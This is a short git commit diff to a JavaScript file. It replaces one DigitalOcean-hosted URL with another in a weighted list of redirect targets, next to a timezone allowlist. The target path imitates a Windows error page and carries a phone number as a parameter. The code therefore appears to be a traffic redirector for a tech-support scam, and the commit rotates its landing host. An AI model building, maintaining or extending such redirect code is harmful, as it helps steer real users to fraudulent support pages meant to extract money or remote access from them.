2b8053bcd2a24a51646515d32789d9253362eb6d
paalakash <palaksh452@gmail.com>
2026-06-23 12:12:24 +0530

    Update RAW_CONFIGS with new URL

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-e4rdh.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5018", weight: 1.0 }
+    { url: "https://glow-app-52qpy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5018", weight: 1.0 }
 
 ];
 
